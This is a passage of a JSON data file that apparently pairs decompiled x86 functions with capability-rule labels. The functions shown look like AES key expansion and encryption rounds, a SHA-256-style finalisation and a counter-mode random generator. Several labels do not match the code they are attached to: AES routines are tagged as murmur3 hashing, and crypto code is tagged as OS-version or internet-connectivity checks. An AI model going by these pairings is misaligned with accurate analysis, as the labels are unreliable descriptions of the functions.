        "decompiled_code": "\nint32_t __cdecl fcn.0040e720(int32_t *arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint32_t arg_10h_00;\n    uint var_20h;\n    \n    arg_10h_00 = arg_14h;\n    if (0x20 < arg_14h) {\n        iVar1 = fcn.0040ff80(arg_10h, arg_14h, &var_20h, 0);\n        if (iVar1 != 0) goto code_r0x0040e7aa;\n        arg_10h = &var_20h;\n        arg_10h_00 = 0x20;\n    }\n    arg_14h = arg_14h & 0xffff0000 | CONCAT11(arg_10h_00, arg_ch);\n    arg_8h_00 = arg_8h + 1;\n    if ((*arg_8h != 0) || (iVar1 = fcn.0040fff0(arg_8h_00, 0),  iVar1 == 0)) {\n        *arg_8h = 1;\n        iVar1 = fcn.004100c0(arg_8h_00, &arg_14h, 2);\n        if (iVar1 == 0) {\n            iVar1 = fcn.004100c0(arg_8h_00, arg_10h, arg_10h_00);\n        }\n    }\ncode_r0x0040e7aa:\n    fcn.0040ef10(&var_20h, 0x20);\n    return iVar1;\n}\n",
        "token_count": 385
    },
    "0040ecc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ecc0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    uint var_40h;\n    uint var_10h;\n    \n    if (0x400 < arg_10h) {\n        return -0x36;\n    }\n    fcn.00401000(&var_40h, 0, 0x30);\n    if (((*(arg_8h + 0x1c) < *(arg_8h + 0x10)) || (*(arg_8h + 0x14) != 0)) &&\n       (iVar1 = fcn.0040edb0(arg_8h, 0, 0),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if (arg_10h != 0) {\n        pcVar2 = arg_8h + 0xf;\n        uVar3 = arg_10h;\ncode_r0x0040ed25:\n        do {\n            *pcVar2 = *pcVar2 + '\\x01';\n            if (*pcVar2 == '\\0') {\n                pcVar2 = pcVar2 + -1;\n                if (0 < pcVar2 + (1 - arg_8h)) goto code_r0x0040ed25;\n            }\n            iVar1 = fcn.00409050(arg_8h + 0x20, 1, arg_8h, &var_10h);\n            if (iVar1 != 0) goto code_r0x0040ed87;\n            if (0x10 < arg_10h) {\n                uVar3 = 0x10;\n            }\n            fcn.004013a0(arg_ch, &var_10h, uVar3);\n            arg_ch = arg_ch + uVar3;\n            pcVar2 = arg_8h + 0xf;\n            uVar3 = arg_10h - uVar3;\n            arg_10h = uVar3;\n        } while (uVar3 != 0);\n    }\n    iVar1 = fcn.0040eba0(arg_8h, &var_40h);\n    if (iVar1 == 0) {\n        *(arg_8h + 0x10) = *(arg_8h + 0x10) + 1;\n    }\ncode_r0x0040ed87:\n    fcn.0040ef10(&var_40h, 0x30);\n    fcn.0040ef10(&var_10h, 0x10);\n    return 0;\n}\n",
        "token_count": 589
    },
    "0040efe0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040efe0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_ch;\n    \n    iVar2 = 0;\n    fcn.0040bb10(&var_ch);\n    fcn.0040bb10(&var_18h);\n    if (arg_14h == 0) {\ncode_r0x0040f075:\n        if (arg_18h == 0) {\ncode_r0x0040f0e3:\n            if (arg_1ch == 0) goto code_r0x0040f164;\n            if ((arg_8h == 0) || (arg_ch == 0)) goto code_r0x0040f15f;\n            iVar2 = fcn.0040c540(&var_ch, arg_1ch, arg_ch);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0040cb40(&var_ch, &var_ch, 1);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.0040c360(&var_ch, &var_ch, arg_8h);\n                    if (iVar2 == 0) {\n                        iVar1 = fcn.0040a470(&var_ch, 0);\n                        if (iVar1 == 0) goto code_r0x0040f164;\n                        goto code_r0x0040f140;\n                    }\n                }\n            }\n        }\n        else {\n            if (arg_ch == 0) goto code_r0x0040f15f;\n            iVar2 = fcn.0040cb40(&var_ch, arg_ch, 1);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0040cb80(&var_18h, arg_18h, arg_10h);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.0040c360(&var_18h, &var_18h, &var_ch);\n                    if (iVar2 == 0) {\n                        iVar1 = fcn.0040a470(&var_18h, 0);\n                        if (iVar1 != 0) goto code_r0x0040f140;\n                        goto code_r0x0040f0e3;\n                    }\n                }\n            }\n        }\n    }\n    else {\n        if (arg_8h == 0) {\ncode_r0x0040f15f:\n            iVar2 = -0x4080;\n            goto code_r0x0040f164;\n        }\n        iVar2 = fcn.0040cb40(&var_ch, arg_8h, 1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.0040cb80(&var_18h, arg_14h, arg_10h);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0040c360(&var_18h, &var_18h, &var_ch);\n                if (iVar2 == 0) {\n                    iVar1 = fcn.0040a470(&var_18h, 0);\n                    if (iVar1 == 0) goto code_r0x0040f075;\ncode_r0x0040f140:\n                    iVar2 = -0x4200;\n                    goto code_r0x0040f164;\n                }\n            }\n        }\n    }\n    if ((iVar2 != -0x4200) && (iVar2 != -0x4080)) {\n        iVar2 = iVar2 + -0x4200;\n    }\ncode_r0x0040f164:\n    fcn.0040b400(&var_ch);\n    fcn.0040b400(&var_18h);\n    return iVar2;\n}\n",
        "token_count": 870
    },
    "0040f190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040f190(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_ch;\n    \n    iVar2 = 0;\n    fcn.0040bb10(&var_ch);\n    fcn.0040bb10(&var_18h);\n    if ((arg_1ch == 0) ||\n       (((arg_ch == 0 || (iVar2 = fcn.0040c0e0(arg_ch, 0x32, arg_1ch, arg_20h),  iVar2 == 0)) &&\n        ((arg_10h == 0 || (iVar2 = fcn.0040c0e0(arg_10h, 0x32, arg_1ch, arg_20h),  iVar2 == 0)))))) {\n        if ((arg_ch == 0) || (arg_10h == 0)) {\ncode_r0x0040f25c:\n            if (((arg_8h != 0) && ((arg_14h != 0 && (arg_18h != 0)))) &&\n               ((iVar1 = fcn.0040a470(arg_14h, 1),  iVar1 < 1 ||\n                (((iVar1 = fcn.0040a470(arg_18h, 1),  iVar1 < 1 || (iVar1 = fcn.0040a4b0(arg_14h, arg_8h),  -1 < iVar1))\n                 || (iVar1 = fcn.0040a4b0(arg_18h, arg_8h),  -1 < iVar1)))))) goto code_r0x0040f3ec;\n        }\n        else if (arg_8h != 0) {\n            iVar2 = fcn.0040c540(&var_ch, arg_ch, arg_10h);\n            if (iVar2 != 0) goto code_r0x0040f3f1;\n            iVar1 = fcn.0040a470(arg_8h, 1);\n            if ((iVar1 < 1) || (iVar1 = fcn.0040a4b0(&var_ch, arg_8h),  iVar1 != 0)) goto code_r0x0040f3ec;\n            goto code_r0x0040f25c;\n        }\n        if ((((arg_ch == 0) || (arg_10h == 0)) || ((arg_14h == 0 || (arg_18h == 0)))) ||\n           (((iVar2 = fcn.0040a470(arg_ch, 1),  0 < iVar2 && (iVar2 = fcn.0040a470(arg_10h, 1),  0 < iVar2)) &&\n            ((iVar2 = fcn.0040c540(&var_ch, arg_14h, arg_18h),  iVar2 != 0 ||\n             ((((iVar2 = fcn.0040cb40(&var_ch, &var_ch, 1),  iVar2 != 0 ||\n                (iVar2 = fcn.0040cb40(&var_18h, arg_ch, 1),  iVar2 != 0)) ||\n               (iVar2 = fcn.0040c360(&var_ch, &var_ch, &var_18h),  iVar2 != 0)) ||\n              ((iVar2 = fcn.0040a470(&var_ch, 0),  iVar2 == 0 &&\n               (((iVar2 = fcn.0040c540(&var_ch, arg_14h, arg_18h),  iVar2 != 0 ||\n                 (iVar2 = fcn.0040cb40(&var_ch, &var_ch, 1),  iVar2 != 0)) ||\n                ((iVar2 = fcn.0040cb40(&var_18h, arg_10h, 1),  iVar2 != 0 ||\n                 ((iVar2 = fcn.0040c360(&var_ch, &var_ch, &var_18h),  iVar2 != 0 ||\n                  (iVar1 = fcn.0040a470(&var_ch, 0),  iVar1 == 0)))))))))))))))) goto code_r0x0040f3f1;\n    }\ncode_r0x0040f3ec:\n    iVar2 = -0x4200;\ncode_r0x0040f3f1:\n    fcn.0040b400(&var_ch);\n    fcn.0040b400(&var_18h);\n    if ((iVar2 == 0) || (iVar1 = iVar2 + -0x4200,  iVar2 == -0x4200)) {\n        iVar1 = iVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 1095
    },
    "0040fd80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040fd80(uint32_t *arg_8h, uchar *arg_ch)\n\n{\n    uint32_t *arg_ch_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    \n    uVar2 = *arg_8h & 0x3f;\n    arg_ch_00 = arg_8h + 10;\n    *(uVar2 + 0x28 + arg_8h) = 0x80;\n    uVar3 = uVar2 + 1;\n    puVar4 = arg_8h + uVar2 + 0x29;\n    if (uVar3 < 0x39) {\n        iVar1 = 0x38 - uVar3;\n        iVar5 = 0;\n    }\n    else {\n        fcn.00401000(puVar4, 0, 0x40 - uVar3);\n        iVar5 = fcn.0040f430(arg_8h, arg_ch_00);\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        iVar1 = 0x38;\n        puVar4 = arg_ch_00;\n    }\n    fcn.00401000(puVar4, iVar5, iVar1);\n    iVar1 = arg_8h[1] << 3;\n    iVar5 = *arg_8h << 3;\n    *(arg_8h + 99) = iVar1 | *arg_8h >> 0x1d;\n    *(arg_8h + 0x18) = iVar1 >> 0x18;\n    *(arg_8h + 0x61) = iVar1 >> 0x10;\n    *(arg_8h + 0x62) = iVar1 >> 8;\n    *(arg_8h + 0x19) = iVar5 >> 0x18;\n    *(arg_8h + 0x65) = iVar5 >> 0x10;\n    *(arg_8h + 0x66) = iVar5 >> 8;\n    *(arg_8h + 0x67) = iVar5;\n    iVar5 = fcn.0040f430(arg_8h, arg_ch_00);\n    if (iVar5 == 0) {\n        *arg_ch = *(arg_8h + 0xb);\n        arg_ch[1] = *(arg_8h + 10);\n        arg_ch[2] = arg_8h[2] >> 8;\n        arg_ch[3] = *(arg_8h + 2);\n        arg_ch[4] = *(arg_8h + 0xf);\n        arg_ch[5] = *(arg_8h + 0xe);\n        arg_ch[6] = arg_8h[3] >> 8;\n        arg_ch[7] = *(arg_8h + 3);\n        arg_ch[8] = *(arg_8h + 0x13);\n        arg_ch[9] = *(arg_8h + 0x12);\n        arg_ch[10] = arg_8h[4] >> 8;\n        arg_ch[0xb] = *(arg_8h + 4);\n        arg_ch[0xc] = *(arg_8h + 0x17);\n        arg_ch[0xd] = *(arg_8h + 0x16);\n        arg_ch[0xe] = arg_8h[5] >> 8;\n        arg_ch[0xf] = *(arg_8h + 5);\n        arg_ch[0x10] = *(arg_8h + 0x1b);\n        arg_ch[0x11] = *(arg_8h + 0x1a);\n        arg_ch[0x12] = arg_8h[6] >> 8;\n        arg_ch[0x13] = *(arg_8h + 6);\n        arg_ch[0x14] = *(arg_8h + 0x1f);\n        arg_ch[0x15] = *(arg_8h + 0x1e);\n        arg_ch[0x16] = arg_8h[7] >> 8;\n        arg_ch[0x17] = *(arg_8h + 7);\n        arg_ch[0x18] = *(arg_8h + 0x23);\n        arg_ch[0x19] = *(arg_8h + 0x22);\n        arg_ch[0x1a] = arg_8h[8] >> 8;\n        arg_ch[0x1b] = *(arg_8h + 8);\n        if (arg_8h[0x1a] == 0) {\n            arg_ch[0x1c] = *(arg_8h + 0x27);\n            arg_ch[0x1d] = *(arg_8h + 0x26);\n            arg_ch[0x1e] = arg_8h[9] >> 8;\n            arg_ch[0x1f] = *(arg_8h + 9);\n        }\n        iVar5 = 0;\n    }\n    return iVar5;\n}\n",
        "token_count": 1159
    },
    "004090c0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004090c0(int32_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0x80) {\n        *arg_8h = 10;\n    }\n    else if (arg_10h == 0xc0) {\n        *arg_8h = 0xc;\n    }\n    else {\n        if (arg_10h != 0x100) {\n            return 0xffffffe0;\n        }\n        *arg_8h = 0xe;\n    }\n    arg_8h[1] = arg_8h + 2;\n    uVar4 = *arg_ch;\n    arg_8h[2] = uVar4;\n    arg_8h[3] = arg_ch[1];\n    arg_8h[4] = arg_ch[2];\n    uVar3 = arg_ch[3];\n    arg_8h[5] = uVar3;\n    if (*arg_8h == 10) {\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 1;\n        uVar1 = arg_8h[3] ^ uVar4;\n        arg_8h[6] = uVar4;\n        uVar2 = arg_8h[4] ^ uVar1;\n        arg_8h[7] = uVar1;\n        uVar3 = uVar3 ^ uVar2;\n        arg_8h[9] = uVar3;\n        arg_8h[8] = uVar2;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 2;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[10] = uVar4;\n        arg_8h[0xb] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0xc] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0xd] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 4;\n        arg_8h[0xe] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0xf] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x10] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x11] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 8;\n        arg_8h[0x12] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x13] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x14] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x15] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 0x10;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x16] = uVar4;\n        arg_8h[0x17] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x18] = uVar2;\n        arg_8h[0x19] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[*(arg_8h + 0x65)]) ^ uVar4 ^ 0x20;\n        arg_8h[0x1a] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x1b] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x1c] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x1d] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0x77)]), str.cw[*(arg_8h + 0x76)]), \n                         str.cw[*(arg_8h + 0x75)]) ^ uVar4 ^ 0x40;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x1e] = uVar4;\n        arg_8h[0x1f] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x20] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x21] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0x87)]), str.cw[*(arg_8h + 0x86)]), \n                         str.cw[*(arg_8h + 0x85)]) ^ uVar4 ^ 0x80;\n        arg_8h[0x22] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x23] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x24] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x25] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0x97)]), str.cw[*(arg_8h + 0x96)]), \n                         str.cw[*(arg_8h + 0x95)]) ^ uVar4 ^ 0x1b;\n        arg_8h[0x26] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x27] = uVar1;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x29] = uVar3;\n        arg_8h[0x28] = uVar2;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0xa7)]), str.cw[*(arg_8h + 0xa6)]), \n                         str.cw[*(arg_8h + 0xa5)]) ^ uVar4 ^ 0x36;\n        uVar1 = uVar1 ^ uVar4;\n        arg_8h[0x2a] = uVar4;\n        arg_8h[0x2b] = uVar1;\n        uVar1 = uVar1 ^ uVar2;\n        arg_8h[0x2c] = uVar1;\n        arg_8h[0x2d] = uVar1 ^ uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 2065
    },
    "004095c0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004095c0(int32_t *arg_8h, uint32_t *arg_ch, uchar *arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h[1];\n    uVar2 = arg_ch[1] ^ puVar1[1];\n    uVar8 = *arg_ch ^ *puVar1;\n    uVar9 = arg_ch[2] ^ puVar1[2];\n    uVar4 = arg_ch[3] ^ puVar1[3];\n    puVar1 = puVar1 + 4;\n    iVar3 = *arg_8h >> 1;\n    while (iVar3 = iVar3 + -1,  0 < iVar3) {\n        uVar5 = *((uVar4 >> 8 & 0xff) * 4 + 0x412a48) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x412e48) ^\n                *((uVar2 >> 0x18) * 4 + 0x413248) ^ *((uVar8 & 0xff) * 4 + 0x412648) ^ *puVar1;\n        uVar6 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x412e48) ^ *((uVar8 >> 8 & 0xff) * 4 + 0x412a48) ^\n                *((uVar9 >> 0x18) * 4 + 0x413248) ^ *((uVar2 & 0xff) * 4 + 0x412648) ^ puVar1[1];\n        uVar7 = *((uVar2 >> 8 & 0xff) * 4 + 0x412a48) ^ *((uVar8 >> 0x10 & 0xff) * 4 + 0x412e48) ^\n                *((uVar4 >> 0x18) * 4 + 0x413248) ^ *((uVar9 & 0xff) * 4 + 0x412648) ^ puVar1[2];\n        uVar4 = *((uVar9 >> 8 & 0xff) * 4 + 0x412a48) ^ *((uVar2 >> 0x10 & 0xff) * 4 + 0x412e48) ^\n                *((uVar8 >> 0x18) * 4 + 0x413248) ^ *((uVar4 & 0xff) * 4 + 0x412648) ^ puVar1[3];\n        uVar8 = *((uVar4 >> 8 & 0xff) * 4 + 0x412a48) ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x412e48) ^\n                *((uVar6 >> 0x18) * 4 + 0x413248) ^ *((uVar5 & 0xff) * 4 + 0x412648) ^ puVar1[4];\n        uVar2 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x412e48) ^ *((uVar5 >> 8 & 0xff) * 4 + 0x412a48) ^\n                *((uVar7 >> 0x18) * 4 + 0x413248) ^ *((uVar6 & 0xff) * 4 + 0x412648) ^ puVar1[5];\n        uVar9 = *((uVar6 >> 8 & 0xff) * 4 + 0x412a48) ^ *((uVar5 >> 0x10 & 0xff) * 4 + 0x412e48) ^\n                *((uVar4 >> 0x18) * 4 + 0x413248) ^ *((uVar7 & 0xff) * 4 + 0x412648) ^ puVar1[6];\n        uVar4 = *((uVar7 >> 8 & 0xff) * 4 + 0x412a48) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x412e48) ^\n                *((uVar5 >> 0x18) * 4 + 0x413248) ^ *((uVar4 & 0xff) * 4 + 0x412648) ^ puVar1[7];\n        puVar1 = puVar1 + 8;\n    }\n    uVar5 = *((uVar4 >> 8 & 0xff) * 4 + 0x412a48) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x412e48) ^\n            *((uVar2 >> 0x18) * 4 + 0x413248) ^ *((uVar8 & 0xff) * 4 + 0x412648) ^ *puVar1;\n    uVar6 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x412e48) ^ *((uVar8 >> 8 & 0xff) * 4 + 0x412a48) ^\n            *((uVar9 >> 0x18) * 4 + 0x413248) ^ *((uVar2 & 0xff) * 4 + 0x412648) ^ puVar1[1];\n    uVar7 = *((uVar2 >> 8 & 0xff) * 4 + 0x412a48) ^ *((uVar8 >> 0x10 & 0xff) * 4 + 0x412e48) ^\n            *((uVar4 >> 0x18) * 4 + 0x413248) ^ *((uVar9 & 0xff) * 4 + 0x412648) ^ puVar1[2];\n    uVar2 = *((uVar9 >> 8 & 0xff) * 4 + 0x412a48) ^ *((uVar2 >> 0x10 & 0xff) * 4 + 0x412e48) ^\n            *((uVar8 >> 0x18) * 4 + 0x413248) ^ *((uVar4 & 0xff) * 4 + 0x412648) ^ puVar1[3];\n    uVar9 = CONCAT31(CONCAT21(CONCAT11(*((uVar6 >> 0x18) + 0x412548), *((uVar7 >> 0x10 & 0xff) + 0x412548)), \n                              *((uVar2 >> 8 & 0xff) + 0x412548)), *((uVar5 & 0xff) + 0x412548)) ^ puVar1[4];\n    uVar8 = CONCAT31(CONCAT21(CONCAT11(*((uVar7 >> 0x18) + 0x412548), *((uVar2 >> 0x10 & 0xff) + 0x412548)), \n                              *((uVar5 >> 8 & 0xff) + 0x412548)), *((uVar6 & 0xff) + 0x412548)) ^ puVar1[5];\n    uVar4 = CONCAT31(CONCAT21(CONCAT11(*((uVar2 >> 0x18) + 0x412548), *((uVar5 >> 0x10 & 0xff) + 0x412548)), \n                              *((uVar6 >> 8 & 0xff) + 0x412548)), *((uVar7 & 0xff) + 0x412548)) ^ puVar1[6];\n    uVar2 = CONCAT31(CONCAT21(CONCAT11(*((uVar5 >> 0x18) + 0x412548), *((uVar6 >> 0x10 & 0xff) + 0x412548)), \n                              *((uVar7 >> 8 & 0xff) + 0x412548)), *((uVar2 & 0xff) + 0x412548)) ^ puVar1[7];\n    *arg_10h = uVar9;\n    arg_10h[1] = uVar9 >> 8;\n    arg_10h[2] = uVar9 >> 0x10;\n    arg_10h[3] = uVar9 >> 0x18;\n    arg_10h[4] = uVar8;\n    arg_10h[5] = uVar8 >> 8;\n    arg_10h[6] = uVar8 >> 0x10;\n    arg_10h[7] = uVar8 >> 0x18;\n    arg_10h[9] = uVar4 >> 8;\n    arg_10h[10] = uVar4 >> 0x10;\n    arg_10h[0xd] = uVar2 >> 8;\n    arg_10h[8] = uVar4;\n    arg_10h[0xc] = uVar2;\n    arg_10h[0xb] = uVar4 >> 0x18;\n    arg_10h[0xe] = uVar2 >> 0x10;\n    arg_10h[0xf] = uVar2 >> 0x18;\n    return 0;\n}\n",
        "token_count": 2171
    },
    "00409b60": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409b60(int32_t *arg_8h, uint32_t *arg_ch, uchar *arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h[1];\n    uVar2 = arg_ch[1] ^ puVar1[1];\n    uVar3 = arg_ch[2] ^ puVar1[2];\n    uVar9 = *arg_ch ^ *puVar1;\n    uVar5 = arg_ch[3] ^ puVar1[3];\n    puVar1 = puVar1 + 4;\n    iVar4 = *arg_8h >> 1;\n    while (iVar4 = iVar4 + -1,  0 < iVar4) {\n        uVar6 = *((uVar3 >> 0x10 & 0xff) * 4 + 0x411d48) ^ *((uVar2 >> 8 & 0xff) * 4 + 0x411948) ^\n                *((uVar5 >> 0x18) * 4 + 0x412148) ^ *((uVar9 & 0xff) * 4 + 0x411548) ^ *puVar1;\n        uVar7 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x411d48) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x411948) ^\n                *((uVar9 >> 0x18) * 4 + 0x412148) ^ *((uVar2 & 0xff) * 4 + 0x411548) ^ puVar1[1];\n        uVar8 = *((uVar5 >> 8 & 0xff) * 4 + 0x411948) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x411d48) ^\n                *((uVar2 >> 0x18) * 4 + 0x412148) ^ *((uVar3 & 0xff) * 4 + 0x411548) ^ puVar1[2];\n        uVar5 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x411d48) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x411948) ^\n                *((uVar3 >> 0x18) * 4 + 0x412148) ^ *((uVar5 & 0xff) * 4 + 0x411548) ^ puVar1[3];\n        uVar9 = *((uVar8 >> 0x10 & 0xff) * 4 + 0x411d48) ^ *((uVar7 >> 8 & 0xff) * 4 + 0x411948) ^\n                *((uVar5 >> 0x18) * 4 + 0x412148) ^ *((uVar6 & 0xff) * 4 + 0x411548) ^ puVar1[4];\n        uVar2 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x411d48) ^ *((uVar8 >> 8 & 0xff) * 4 + 0x411948) ^\n                *((uVar6 >> 0x18) * 4 + 0x412148) ^ *((uVar7 & 0xff) * 4 + 0x411548) ^ puVar1[5];\n        uVar3 = *((uVar5 >> 8 & 0xff) * 4 + 0x411948) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x411d48) ^\n                *((uVar7 >> 0x18) * 4 + 0x412148) ^ *((uVar8 & 0xff) * 4 + 0x411548) ^ puVar1[6];\n        uVar5 = *((uVar7 >> 0x10 & 0xff) * 4 + 0x411d48) ^ *((uVar6 >> 8 & 0xff) * 4 + 0x411948) ^\n                *((uVar8 >> 0x18) * 4 + 0x412148) ^ *((uVar5 & 0xff) * 4 + 0x411548) ^ puVar1[7];\n        puVar1 = puVar1 + 8;\n    }\n    uVar6 = *((uVar3 >> 0x10 & 0xff) * 4 + 0x411d48) ^ *((uVar2 >> 8 & 0xff) * 4 + 0x411948) ^\n            *((uVar5 >> 0x18) * 4 + 0x412148) ^ *((uVar9 & 0xff) * 4 + 0x411548) ^ *puVar1;\n    uVar7 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x411d48) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x411948) ^\n            *((uVar9 >> 0x18) * 4 + 0x412148) ^ *((uVar2 & 0xff) * 4 + 0x411548) ^ puVar1[1];\n    uVar8 = *((uVar5 >> 8 & 